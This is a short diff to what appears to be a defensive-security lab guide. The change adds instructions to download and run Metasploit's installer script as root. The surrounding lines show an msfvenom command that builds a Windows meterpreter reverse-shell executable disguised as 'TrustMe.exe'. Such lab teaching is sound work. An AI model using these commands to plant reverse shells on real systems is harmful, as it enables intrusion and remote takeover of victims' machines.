@@ -42,7 +42,10 @@ Now, run the following commands to start a simple backdoor and backdoor listener
 
 $ `sudo su -`
 Please note, the adhd password is adhd.
+if you don't have metasploit already installed on your lab just run command below as root:
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
 
+and then:
 /#`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 -f exe -o /tmp/TrustMe.exe`
 
 /#`cd /tmp`
